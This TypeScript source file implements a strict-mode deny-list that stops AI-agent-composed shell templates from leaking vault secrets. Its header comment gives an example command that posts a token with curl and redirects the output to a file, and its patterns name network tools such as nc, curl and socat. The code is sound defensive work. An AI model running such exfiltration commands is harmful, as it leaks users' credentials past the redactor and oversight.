/**
 * MConnect Vault — template-allowlist policy
 *
 * Closes the "agent-controlled bash composition" hole flagged by the
 * lockshell production audit (MAJOR #1). Lockshell's `run` subcommand
 * delegates to `bash -c` internally on the resolved template. Quoting
 * around `"$NAME"` protects the secret VALUE, but the surrounding shell
 * surface still honours `;`, `&&`, `>`, `>>`, `$(...)`, backticks, and
 * pipes. An agent that emits, say, `curl -d "{{TOKEN}}" host > /tmp/leak`
 * exfiltrates the secret around the redactor by writing to a file.
 *
 * The fix is to refuse template strings whose shape suggests
 * composition beyond a single command + arguments. We pattern-match a
 * deny-list of shell metacharacters BEFORE wrapping with `lockshell
 * run`. False positives are acceptable in `'strict'` mode — if a real
 * workflow needs a pipe, the operator can drop to `'permissive'`
 * explicitly.
 *
 * Modes:
 *   - `'strict'`   — block any deny-listed metacharacter when placeholders
 *                    are present. Default for production.
 *   - `'permissive'` — allow everything (current pre-allowlist behavior).
 *                      Operator must opt in (`--vault-permissive`).
 */

export type VaultStrictness = 'strict' | 'permissive';

export interface PolicyVerdict {
  allowed: boolean;
  /** When `allowed === false`: the metacharacter sequence that tripped the policy. */
  blockedPattern?: string;
  /** Human-readable explanation. */
  reason?: string;
}

/**
 * Patterns that indicate shell composition beyond `cmd args...`.
 * Each entry is `{ pattern, label }` so the user-facing block message
 * names what was wrong. Order matters — the first matching pattern
 * wins. Patterns are deliberately conservative: a literal sequence
 * inside a single-quoted string IS still flagged, because we want to
 * shrink the agent-controllable surface, not police shell quoting.
 */
const DENY_PATTERNS: ReadonlyArray<{ pattern: RegExp; label: string }> = [
  { pattern: /\$\(/, label: 'command substitution `$(...)`' },
  { pattern: /`/, label: 'backtick command substitution' },
  { pattern: /(?<![\w-])>{1,2}\s*\S/, label: 'output redirection (`>` or `>>`)' },
  { pattern: /(?<![\w-])2\s*>\s*\S/, label: 'stderr redirection (`2>`)' },
  { pattern: /(?<![\w-])\|\s*(?:nc|curl|wget|telnet|ncat|socat)\b/, label: 'pipe to network tool' },
  { pattern: /;\s*\S/, label: 'compound command separator (`;`)' },
  { pattern: /&&|\|\|/, label: 'compound command operator (`&&` or `||`)' },
  { pattern: /(?<![\w-])&\s*$/, label: 'trailing `&` background-job' },
];

export function checkTemplate(template: string, mode: VaultStrictness): PolicyVerdict {
  if (mode === 'permissive') {
    return { allowed: true };
  }
  for (const { pattern, label } of DENY_PATTERNS) {
    if (pattern.test(template)) {
      return {
        allowed: false,
        blockedPattern: label,
        reason:
          `Vault strict mode rejects ${label} in placeholder-bearing commands. ` +
          `An attacker-controlled template could use this to exfiltrate the ` +
          `resolved secret around the output redactor. Rewrite the command ` +
          `so the only shell construct is "command args [{{PLACEHOLDER}} ...]".`,
      };
    }
  }
  return { allowed: true };
}

/**
 * Stable default for new sessions. Keeping `'strict'` as the default
 * means an operator who does not pass the strictness flag at all gets
 * the safer mode automatically.
 */
export const DEFAULT_STRICTNESS: VaultStrictness = 'strict';
